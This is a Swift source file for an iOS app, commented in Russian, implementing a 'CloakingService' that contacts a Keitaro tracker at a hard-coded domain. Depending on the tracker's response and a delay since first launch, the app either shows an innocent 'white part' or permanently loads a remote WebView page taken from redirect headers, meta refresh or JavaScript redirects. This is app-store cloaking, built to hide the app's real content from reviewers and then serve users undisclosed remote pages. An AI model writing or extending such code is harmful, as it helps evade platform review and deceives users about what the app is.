import Foundation

/// Сервис для работы с кейтаро трекером
class CloakingService {
    static let shared = CloakingService()
    
    // MARK: - Configuration
    
    /// URL кейтаро трекера (легко изменить для тестирования)
    private var trackerURL = "https://zhenazanag.pro/7L7RRMSF"
    
    /// Количество дней до активации WebView (настраиваемый параметр)
    static let daysBeforeActivation = 3
    
    /// ВРЕМЕННО: Отключить проверку 3 дней (для тестирования)
    /// Установите в false для включения проверки
    private let skipDaysCheck = true // TODO: Вернуть в false для продакшена
    
    // MARK: - Init
    private init() {}
    
    // MARK: - Public Methods
    
    /// Проверить клоакинг и вернуть результат
    func checkCloaking() async throws -> CloakingResult {
        print("🔐 [CloakingService] Starting cloaking check...")
        print("📅 [CloakingService] Days before activation: \(Self.daysBeforeActivation)")
        
        // ВРЕМЕННО: Пропускаем проверку дней если флаг установлен
        if skipDaysCheck {
            print("⚠️ [CloakingService] ВРЕМЕННО: Проверка 3 дней ОТКЛЮЧЕНА (skipDaysCheck = true)")
        } else {
            // Проверяем, прошло ли нужное количество дней
            let hasPassed = StorageManager.shared.hasPassedDaysSinceFirstLaunch(Self.daysBeforeActivation)
            print("⏱️ [CloakingService] Has passed required days: \(hasPassed)")
            
            guard hasPassed else {
                print("🚫 [CloakingService] Not enough days passed, showing white part")
                return .showWhitePart
            }
        }
        
        // Проверяем сохраненный результат
        if let savedResult = StorageManager.shared.cloakingResult {
            print("💾 [CloakingService] Found saved result: \(savedResult)")
            if savedResult, let url = StorageManager.shared.cloakingURL {
                print("🌐 [CloakingService] Returning saved WebView URL: \(url)")
                return .showWebView(url: url)
            } else {
                print("⚪ [CloakingService] Saved result says show white part")
                return .showWhitePart
            }
        }
        
        // Если результата нет и была network error, пробуем снова
        // Если результата нет, делаем запрос к трекеру
        print("🌐 [CloakingService] No saved result, fetching from tracker...")
        return try await fetchCloakingResult()
    }
    
    /// Установить кастомный URL трекера (для тестирования)
    func setTrackerURL(_ url: String) {
        trackerURL = url
    }
    
    // MARK: - Private Methods
    
    private func fetchCloakingResult() async throws -> CloakingResult {
        print("🌐 [CloakingService] Starting request to tracker...")
        print("🔗 [CloakingService] Tracker URL: \(trackerURL)")
        
        guard let url = URL(string: trackerURL) else {
            print("❌ [CloakingService] Invalid URL: \(trackerURL)")
            throw CloakingError.invalidURL
        }
        
        var request = URLRequest(url: url)
        request.timeoutInterval = 10.0
        request.httpMethod = "GET"
        
        print("📤 [CloakingService] Sending GET request...")
        print("⏱️ [CloakingService] Timeout: 10 seconds")
        
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            
            guard let httpResponse = response as? HTTPURLResponse else {
                print("❌ [CloakingService] Invalid response type")
                throw CloakingError.invalidResponse
            }
            
            print("📥 [CloakingService] Response received")
            print("📊 [CloakingService] Status code: \(httpResponse.statusCode)")
            print("📋 [CloakingService] Headers: \(httpResponse.allHeaderFields)")
            
            // Пытаемся распечатать тело ответа
            if let responseString = String(data: data, encoding: .utf8) {
                print("📄 [CloakingService] Response body: \(responseString.prefix(200))...")
            }
            
            // Обрабатываем ответ согласно новой логике
            switch httpResponse.statusCode {
            case 404:
                print("🚫 [CloakingService] Status 404 - Not Found")
                // Только 404 показываем белую часть и сохраняем результат
                StorageManager.shared.saveCloakingResult(shouldShowWebView: false, url: nil)
                print("💾 [CloakingService] Result saved: show white part")
                return .showWhitePart
                
            default:
                // Любой другой код (включая 200, 401, и т.д.) - пытаемся найти URL
                print("📊 [CloakingService] Status \(httpResponse.statusCode) - Looking for redirect URL")
                
                // Пытаемся извлечь URL из ответа
                if let redirectURL = extractRedirectURL(from: httpResponse, data: data) {
                    print("🎯 [CloakingService] Found redirect URL: \(redirectURL)")
                    // Сохраняем результат навсегда
                    StorageManager.shared.saveCloakingResult(shouldShowWebView: true, url: redirectURL)
                    print("💾 [CloakingService] Result saved: show WebView")
                    return .showWebView(url: redirectURL)
                } else {
                    print("⚠️ [CloakingService] No redirect URL found, using tracker URL as fallback")
                    // Если не нашли URL в ответе, используем сам URL трекера
                    StorageManager.shared.saveCloakingResult(shouldShowWebView: true, url: trackerURL)
                    print("💾 [CloakingService] Result saved: show WebView with tracker URL")
                    return .showWebView(url: trackerURL)
                }
            }
            
        } catch {
            // При ошибке сети НЕ сохраняем результат
            print("❌ [CloakingService] Network error: \(error.localizedDescription)")
            StorageManager.shared.clearCloakingResult()
            print("🗑️ [CloakingService] Cleared cloaking result due to network error")
            throw CloakingError.networkError(error)
        }
    }
    
    private func extractRedirectURL(from response: HTTPURLResponse, data: Data) -> String? {
        print("🔍 [CloakingService] Extracting redirect URL...")
        
        // Сначала проверяем заголовок Location
        if let location = response.allHeaderFields["Location"] as? String {
            print("📍 [CloakingService] Found Location header: \(location)")
            return location
        }
        
        // Проверяем кастомные заголовки, которые может использовать кейтаро
        if let redirectURL = response.allHeaderFields["X-Redirect-URL"] as? String {
            print("📍 [CloakingService] Found X-Redirect-URL header: \(redirectURL)")
            return redirectURL
        }
        
        // Если в заголовках нет, предполагаем что URL может быть в финальном URL после редиректов
        if let finalURL = response.url?.absoluteString,
           finalURL != trackerURL {
            print("📍 [CloakingService] Using final URL after redirects: \(finalURL)")
            return finalURL
        }
        
        // Пытаемся найти URL в теле ответа (например, в мета-тегах или JavaScript редиректах)
        if let responseString = String(data: data, encoding: .utf8) {
            print("🔍 [CloakingService] Searching for URL in response body...")
            
            // Ищем meta refresh
            let metaPattern = #"<meta[^>]*http-equiv\s*=\s*["']refresh["'][^>]*content\s*=\s*["']\d+;\s*url=([^"']+)["']"#
            if let regex = try? NSRegularExpression(pattern: metaPattern, options: .caseInsensitive),
               let match = regex.firstMatch(in: responseString, range: NSRange(location: 0, length: responseString.count)),
               match.numberOfRanges > 1 {
                let urlRange = match.range(at: 1)
                if let range = Range(urlRange, in: responseString) {
                    let foundURL = String(responseString[range])
                    print("📍 [CloakingService] Found meta refresh URL: \(foundURL)")
                    return foundURL
                }
            }
            
            // Ищем window.location или location.href
            let jsPatterns = [
                #"window\.location\s*=\s*["']([^"']+)["']"#,
                #"location\.href\s*=\s*["']([^"']+)["']"#,
                #"window\.location\.href\s*=\s*["']([^"']+)["']"#
            ]
            
            for pattern in jsPatterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
                   let match = regex.firstMatch(in: responseString, range: NSRange(location: 0, length: responseString.count)),
                   match.numberOfRanges > 1 {
                    let urlRange = match.range(at: 1)
                    if let range = Range(urlRange, in: responseString) {
                        let foundURL = String(responseString[range])
                        print("📍 [CloakingService] Found JavaScript redirect URL: \(foundURL)")
                        return foundURL
                    }
                }
            }
        }
        
        print("❌ [CloakingService] No redirect URL found")
        return nil
    }
}

// MARK: - Models

enum CloakingResult {
    case showWebView(url: String)
    case showWhitePart
}

enum CloakingError: LocalizedError {
    case invalidURL
    case invalidResponse
    case networkError(Error)
    
    var errorDescription: String? {
        switch self {
        case .invalidURL:
            return "Invalid tracker URL"
        case .invalidResponse:
            return "Invalid response from tracker"
        case .networkError(let error):
            return "Network error: \(error.localizedDescription)"
        }
    }
} 